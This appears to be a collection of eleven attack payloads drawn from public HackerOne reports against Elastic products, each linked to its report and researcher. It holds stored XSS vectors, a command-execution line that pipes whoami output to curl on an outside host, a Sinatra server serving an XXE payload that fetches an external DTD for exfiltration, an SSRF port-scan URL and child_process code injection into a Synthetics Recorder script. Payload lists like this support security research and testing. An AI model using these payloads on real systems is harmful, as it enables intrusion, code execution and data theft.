# Elastic

11 payloads.

### `d1bfb0e1`

```
{
"url":"javascript://test%0aalert(document.domain)"
}
```

— [Stored XSS in Elastic App Search](https://hackerone.com/reports/846905) · Elastic · [iamnoooob](https://hackerone.com/iamnoooob) · $2,000.0

### `4063eda0`

```
whoami | curl https://target.com/ -d@-
```

— [Remote Code Execution on Cloud via latest Kibana 7.6.2](https://hackerone.com/reports/852613) · Elastic · [alexbrasetvik](https://hackerone.com/alexbrasetvik) · $10,000.0

### `21dd2cc0`

```
confirm("XSS Less plugin");
module.exports = {
  install: function(less, pluginManager, functions) {
    functions.add('xss', function(val) {
      return val.value;
    });
  }
};
```

— [Stored XSS in TSVB Visualizations Markdown Panel](https://hackerone.com/reports/858874) · Elastic · [jeremybuis](https://hackerone.com/jeremybuis)

### `c66da288`

```
confirm('XSS')\
```

— [Stored XSS in TSVB Visualizations Markdown Panel](https://hackerone.com/reports/858874) · Elastic · [jeremybuis](https://hackerone.com/jeremybuis)

### `65d0ad3a`

```
]=alert(document.domain)
```

— [Prototype Pollution leads to XSS on https://target.com/#__proto__\[asd\]=alert(document.domain)](https://hackerone.com/reports/998398) · Elastic · [s1r1u5](https://hackerone.com/s1r1u5)

### `d5957146`

```
require 'sinatra'

set :bind, '0.0.0.0'

get '/robots.txt' do

  'User-agent: *
Disallow:

sitemap: /sitemap.xml
'
end

get '/sitemap.xml' do
  content_type 'application/xml'

  '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
<!ENTITY % dtd SYSTEM "http://target.com/exfil.dtd">
%dtd;
%param1;
%exfil;
]>
<urlset xmlns="http://evil.com/schemas/sitemap/0.9" 
    xmlns:xsi="http://evil2.com/2001/XMLSchema-instance"
    xsi:schemaLocation="http://evil.com/schemas/sitem
```

— [XXE in Enterprise Search's App Search web crawler](https://hackerone.com/reports/1156748) · Elastic · [dee-see](https://hackerone.com/dee-see)

### `f91b7f51`

```
http://javascript:alert(1)
```

— [\[Swiftype\] - Stored XSS via document field `url` triggers on `https://target.com/engines/<engine>/document_types/<type>/documents/<id>`](https://hackerone.com/reports/1245787) · Elastic · [superman85](https://hackerone.com/superman85)

### `ad47d9f9`

```
http://target.com:22
```

**Parameter:** `url`
— [blind Server-Side Request Forgery (SSRF)  allows scanning internal ports](https://hackerone.com/reports/1300585) · Elastic · [lu3ky-13](https://hackerone.com/lu3ky-13)

### `661e9843`

```
The retrieve the content from file `                                 `
```

**Parameter:** `account_name`
— [CVE-2021-40870 on \[52.204.160.31\]](https://hackerone.com/reports/1356845) · Elastic · [fdeleite](https://hackerone.com/fdeleite)

### `b936b46d`

```
page.waitForNavigation(/*{ url: 'https://example.com?q=*/require(`child_process`).exec(`touch$IFS/tmp/dee-see`)/*' }*/),
```

**Parameter:** `q`
— [Synthetics Recorder: Code injection when recording website with malicious content](https://hackerone.com/reports/1636382) · Elastic · [dee-see](https://hackerone.com/dee-see)

### `3dcef316`

```
step('Go to http://target.com:4567/', async () => {
      await page.goto('http://target.com:4567/');
      await Promise.all([
        page.waitForNavigation(/*{ url: 'https://evil.com/dee-see?query=*/require(`child_process`).exec(`touch$IFS/tmp/dee-see`)/*' }*/),
        page.click('[aria-label="GitLab"] svg')
      ]);
    });
```

**Parameter:** `query`
— [Synthetics Recorder: Code injection when recording website with malicious content](https://hackerone.com/reports/1636382) · Elastic · [dee-see](https://hackerone.com/dee-see)
